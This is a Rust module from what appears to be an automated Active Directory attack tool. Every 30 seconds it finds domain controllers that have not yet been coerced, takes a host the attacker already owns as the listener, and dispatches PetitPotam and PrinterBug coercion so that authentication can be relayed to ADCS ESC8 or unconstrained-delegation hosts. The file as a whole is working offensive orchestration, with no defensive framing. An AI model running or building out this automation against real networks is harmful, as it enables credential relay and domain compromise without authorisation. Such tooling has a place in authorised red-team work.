//! auto_coercion -- trigger ESC8 relay and DC coercion.

use std::sync::Arc;
use std::time::Duration;

use tokio::sync::watch;
use tracing::{info, warn};

use crate::dispatcher::Dispatcher;
use crate::state::*;

/// Triggers coercion attacks when ADCS ESC8 servers or unconstrained delegation hosts exist.
/// Interval: 30s. Matches Python `_auto_coercion`.
pub async fn auto_coercion(dispatcher: Arc<Dispatcher>, mut shutdown: watch::Receiver<bool>) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        // Coerce DCs that haven't been coerced yet
        let work: Vec<(String, String)> = {
            let state = dispatcher.state.read().await;
            // Find any host with unconstrained delegation as a listener
            let _listener = state.hosts.iter().find(|h| {
                h.roles
                    .iter()
                    .any(|r| r.to_lowercase().contains("unconstrained"))
            });

            state
                .domain_controllers
                .iter()
                .filter(|(_, dc_ip)| !state.is_processed(DEDUP_COERCED_DCS, dc_ip))
                .map(|(domain, dc_ip)| (domain.clone(), dc_ip.clone()))
                .collect()
        };

        for (domain, dc_ip) in work {
            // Find a listener IP for the coercion (any host we own)
            let listener_ip = {
                let state = dispatcher.state.read().await;
                state.hosts.iter().find(|h| h.owned).map(|h| h.ip.clone())
            };

            let listener = match listener_ip {
                Some(ip) => ip,
                None => continue,
            };

            match dispatcher
                .request_coercion(&dc_ip, &listener, &["petitpotam", "printerbug"])
                .await
            {
                Ok(Some(task_id)) => {
                    info!(task_id = %task_id, dc = %dc_ip, domain = %domain, "DC coercion dispatched");
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_COERCED_DCS, dc_ip.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_COERCED_DCS, &dc_ip)
                        .await;
                }
                Ok(None) => {}
                Err(e) => warn!(err = %e, "Failed to dispatch coercion"),
            }
        }
    }
}
